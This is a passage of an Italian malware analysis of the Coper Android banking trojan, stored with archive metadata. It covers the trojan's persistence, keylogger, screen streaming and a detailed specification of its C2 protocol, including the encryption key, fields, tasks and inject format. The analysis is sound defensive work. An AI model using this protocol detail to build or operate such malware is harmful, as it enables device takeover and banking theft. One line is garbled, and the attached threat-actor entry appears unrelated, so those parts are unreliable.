il servizio di accessibilità è attivo). Infatti, se si prova a rimuovere l’app dall’elenco degli Admin, viene mostrato un messaggio (in inglese) che chiede all’utente se vuole cancellare tutti i dati, nel tentativo di scoraggiarlo.\n\n Qualora l’app venga effettivamente rimossa dallo stato di Admin, come estremo tentativo Coper riapre le impostazioni di Admin in modo che il servizio di accessibilità la reinserisca in automatico.\n\n Quando invece viene ricevuta una notifica, questa è inviata al C2 e se nelle SharedPreferences è indicato, la notifica è anche cancellata per evitare che l’utente la veda.\n\n Il servizio di accessibilità esegue una serie di operazioni:\n\n Se lo streaming del servizio VNC è attivo, viene inviata la gerarchia delle view dello schermo, con tanto di testo. Questo permette di ricostruire fedelmente quanto visibile nello schermo. Se è attiva un’app per cui è presente un inject abilitato, questo viene mostrato. Impedisce l’accesso alle app indicate nelle shared preferences. Esegue l’ACSB task.\n\n\n-----\n\n#### u o a da ey ogge a t co a tà te essa te è c e dat ubat c udo o o a o d co testo co e pac age ed o e de a risorsa da cui provengono, eventuali URL. Inoltre Coper ha una funzionalità apposita per il furto del PIN/password/pattern per lo sblocco dello schermo.\n\n Il keylogger di Coper è piuttosto distintivo poichè fornisce informazioni molto utili agli attaccanti e riesce perfino a recuperare i codici di sblocco del telefono. I dati acquisiti sono salvati in un file kl.txt e poi inviati dal Bot.\n\n Il servizio VNC non utilizza l’omonima app, sfrutta invece il servizio di accessibilità per fare streaming del layout visibile sullo schermo oppure ScreenStreamService e SendScreenshotSrv per fare screenshot ogni secondo ed inviarli al C2.\n\n Lo stream del layout richiede poca banda ma non mostra le immagini (solo testo e struttura) mentre lo stream a screenshot emula uno streaming come VNC ma richiede molta più banda perchè le immagini dei vari screenshot non sono compresse lungo l’asse temporale come avviene in uno streaming video.\n\n Coper ha una funzionalità di Auto-Test (classe AutoTest) che permette di conoscere lo stato del bot.\n Viene attivata quando il C2 chiede al bot di inviare un SMS al numero “7”. Il contenuto del messaggio è il comando � Auto-Test da eseguire.\n\n I comandi Auto-Test sono:\n\n smarts – per ricevere gli inject configurati; prefs – per ricevere le shared preferences; info – per ricevere lo stato del servizio Bot e dei due di streaming e i permessi ottenuti.\n\n## Formato delle richieste e risposte verso il C2\n\n#### Come esposto sopra, le richieste al C2 sono in formato JSON. Ogni richiesta (ping, registrazione, nuovo sms, screenshot, e così via) è un oggetto JSON con il suo formato a cui sono aggiunti delle proprietà standard.\n\n Il JSON è poi serializzato in una stringa, cifrato con AES-128-ECB con padding PCKS5 e chiave presa dalla configurazione statica del malware (Config.customHeaderValue, 60170 nel campione analizzato), il risultato è convertito in base64 e GZIP.\n\n Il tutto è inviato alle URL configurate tramite POST HTTP standard a cui è aggiunto un header di nome Config.customHeaderName (Packet- Sent nel campione analizzato) e valore pari alla chiave AES usata.\n\n Da investigare se il C2 usa questo header per ottenere la chiave di decifratura o se l’header è usato per discernere le richieste fatte dal malware.\n\n Nota: con “0” o “1” si intendono le stringhe contenenti i caratteri ‘0’ e ‘1’, non i numeri 0 e 1.\n\n### Proprietà standard di ogni richiesta\n\n#### lB Funzionalità non chiara. Il valore è preso da Config e vale DONOTFILTER.\n\n lL “1” se nel dispositivo è installata l’app Config.applicationTitle, il carattere “0” altrimenti.\n\n bI ID del bot.\n\n iA “1” o “0” a seconda se il malware è gestore di SMS.\n\n dA “1” o “0” a seconda se il malware è Device Admin.\n\n lK “1” o “0” a seconda se è attivo il blocco software del dispositivo.\n\n iAc “0” se il servizio di accessibilità non è installato, “1” se lo è ed è avviato, “2” se lo è ma non è avviato.\n\n iPa “1” o “0” a seconda se il receiver delle notifiche è stato abilitato.\n\n iBC Intero con il livello della batteria.\n\n iCP “1” o “0” a seconda se il dispositivo è collegato alla corrente.\n\n iSE “1” o “0” a seconda se lo schermo è bloccato.\n\n iSp Intero che indica il numero di volte che il malware ha provato ad assegnarsi automaticamente i permessi.\n\n iFp Elenco CSV dei permessi non ancora ottenuti (i nomi NON sono FQN, esempio: SEND_SMS e non android.permission.SEND_SMS).\n\n cTsk Task ACSB corrente o “”.\n\n up Intero che rappresenta l’uptime (secondi dalla registrazione) o 0 se mai registrato.\n\n kL “1” o “0” a seconda se il keylogger è abilitato.\n\n\n-----\n\n#### vnc Comandi VNC correnti.\n\n fgM “1” o “0” a seconda se il servizio Bot è in foreground o meno.\n\n iAg “1” o “0” a seconda se il dispositivo è un dispositivo con poca RAM.\n\n rIP Informazioni sull’IP esterno del dispositivo. Si veda Net.getRealIPInfo.\n\n xc Tipo di richiesta\n\n### Registrazione\n\n#### xc bR\n\n tA ID dispositivo\n\n tB Numero di telefono\n\n tC Paese del dispositivo\n\n tD Lingua del dispositivo\n\n tE Build release del dispositivo\n\n tF Modello del dispositivo\n\n tG Nome dell’operatore\n\n lA App di sistema installate\n\n### Ping\n\n#### xc bP\n\n tA ID dispositivo\n\n tB Numero di telefono\n\n lA App installate. Presente ogni 10 minuti.\n\n rZ Array JSON in cui ogni elemento è “task_id: task_result” per gli ultimi task del bot.\n\n nS JSON che rappresenta gli SMS ricevuti. Si vedano Misc.removeFromNewSMS e SMSStealer.makeObjFromSMS.\n\n### Nuovo SMS ricevuto\n\n#### xc bS\n\n sA Mittente\n\n sB Testo del messaggio\n\n sT Data in formato dd/MM/yyyy HH:mm:ss\n\n### Errore (eccezioni e simili)\n\n#### xc bP\n\n rZ Un array vuoto.\n\n eM Messaggio di errore\n\n### Stringhe\n\n#### xc bP\n\n rZ Un array vuoto.\n\n kM Stringa da inviare. Usata per alcune notifiche al C2.\n\n### Screenshot\n\n\n-----\n\n#### xc vncScr\n\n fn Nome del file\n\n bs Dati del file in base64\n\n### Dati rubati con inject\n\n#### xc sSD\n\n sPK Package dell’inject\n\n spD Dati dell’Inject.\n\n sFd Booleano. Vero se questo pacchetto contiene tutti i dati rubabili con l’Inject.\n\n### Richiesta di download inject\n\n#### xc gSWI\n\n### Invio delle informazione di layout della finestra corrente\n\n#### xc bP\n\n rZ Array vuoto\n\n vncd Dati. Si veda VNC.sendRootDataToPanel.\n\n### Risposta del C2\n\n#### response Se REG_SUCCESS il bot si è registrato correttamente. In realtà REG_SUCCESS è cercato come stringa nella risposta, potrebbe comparire in ogni proprietà.\n\n response Se una stringa che inizia per SMS_OK_ allora è seguita da un elenco CSV degli SMS correttamente ricevuti (saranno rimossi dalle SharedPreferences).\n\n response Se è un oggetto che contiene un array “smarts” rappresenta gli inject da salvare. vedi sotto.\n\n panel_starts_ver Progressivo per indicare la versione degli inject corrente\n\n injects_to_enable CSV degli inject da abilitare\n\n injects_to_disable CSV degli inhect da disabilitare\n\n extra_domains CSV degli URL C2 aggiuntivi\n\n block_push_apps CSV delle app di cui bloccare le notifica\n\n minime_apps CSV delle app di cui impedire l’accesso\n\n uninstall_apps CSV delle app da disintallare\n\n block_push_delay Delay per il blocco delle notifiche (prima di questo delay non è fatto)\n\n minimize_delay Simile a sopra\n\n uninstall_delay Simile a sopra\n\n keylogger_delay Simile a sopra\n\n get_device_admin_delay Simile a sopra\n\n injects_delay Simile a sopra\n\n keylogger_enabled 1 se abilitare il keylogger\n\n net_delay Delay per i ping\n\n vnc_tasks Task VNC, array\n\n tasks Task, array\n\n### Formato degli inject\n\n\n-----\n\n#### Ogni elemento dell’array è un oggetto JSON così strutturato:\n\n is_active Boolean vero se l’inject è attivo\n\n package HTML dell’inject o URL\n\n cap_data HTML dell’inject (con i dati catturati?) o URL\n\n show_cap Se usare data o cap_data\n\n type html oppure url\n\n icon Base64 con l’icona dell’inject\n\n### Formato dei task\n\n#### Ogni elemento dell’array è un oggetto JSON del tipo:\n\n id Id del task\n\n task_type Tipo del task\n\n data Parametri del task\n\n### Tipi di task e formato dei dati\n\n#### ussd Numero da chiamare\n\n sms destinatario|messaggio. Se destinatario = “7 ” allora messaggio è un codice AutoTest.\n\n register_again\n\n lock_on\n\n lock_off\n\n intercept_on\n\n vnc_start Comando VNC\n\n vnc_stop\n\n push Notifca con “titolo|testo|package da aprire”\n\n kill_bot\n\n start_keylogger\n\n stop_keylogger\n\n uninstall_apps CSV app da disinstallare\n\n start_fg\n\n stop_fg\n\n open_url URL\n\n disable_inject Package inject\n\n enable_inhect Package inject\n\n run_app Package da lanciare\n\n### Formato dei task VNC\n\n#### Ogni elemento dell’array è un oggetto JSON con le seguenti proprietà:\n\n type Tipo di task\n\n data Parametri del task\n\n### Tipi di task VNC e loro dati\n\n\n-----\n\n#### clickat coordinate\n\n gesture coordinate (multiple)\n\n set_text testo\n\n long_click coordinate\n\n action unlock_touch, quick_settings, lock_screen, swipe_up/down/right/left, back, home, power, toggle_split_screen, take_screenshot, recents, notifications\n\n set_clip testo\n\n paste\n\n send_pattern pattern\n\n scrool direzione di scrool\n\n### Il formato del comando VNC\n\n#### Il comando è formato da un serie di stringhe separate da punto e virgola (;)\n\n STREAM_SCREEN Invia screenshot al C2 ogni secondo\n\n STRAM_LAYOUT Invia il layout (con testo) della finestra corrente al C2\n\n BLACK Mostra un overlay nero sullo schermo\n\n SILENT Disabilita suono e notifiche\n\n### Formato delle shared preferences\n\n#### Il formato delle SharedPreferences segue molto quello delle risposte del C2. Ovviamente ci sono delle differenze: ad esempio ogni inject è salvato in una preferenza stringa di nome inj_XXX dove XXX è il package target dell’inject ed il valore stringa è la serializzazione dell’oggetto JSON dell’inject stesso.\n\n Il valore smart_injects contiene poi una lista CSV degli inject presenti. In modo simile vale per altre proprietà: gli SMS catturati sono salvati in new_sms, che è un oggetto JSON indicizzato dal timestamp dell’SMS.\n\n Taggato coper\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-07-19 - Analysis and technical insights on the Coper malware used to attack mobile devices.pdf"
    ],
    "report_names": [
        "2022-07-19 - Analysis and technical insights on the Coper malware used to attack mobile devices.pdf"
    ],
    "threat_actors": [
        {
            "id": "aa73cd6a-868c-4ae4-a5b2-7cb2c5ad1e9d",
            "created_at": "2022-10-25T16:07:24.139848Z",
            "updated_at": "2025-03-27T02:02:10.120505Z",
            "deleted_at": null,
            "main_name": "Safe",
            "aliases": [],
            "source_name": "ETDA:Safe",
            "tools": [
                "DebugView",
                "LZ77",
                "OpenDoc",
                "SafeDisk",
                "TypeConfig",
                "UPXShell",
                "UsbDoc",
                "UsbExe"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673536098,
    "ts_updated_at": 1743041121,
    "ts_creation_date": 1660793134,
    "ts_modification_date": 1660793134,
    "files": {
        "pdf": "https://archive.orkl.eu/263b8046a0629442045dd6d41e666c4ff6bed604.pdf",
        "text": "https://archive.orkl.eu/263b8046a0629442045dd6d41e666c4ff6bed604.txt",
        "img": "https://archive.orkl.eu/263b8046a0629442045dd6d41e666c4ff6bed604.jpg"
    }
}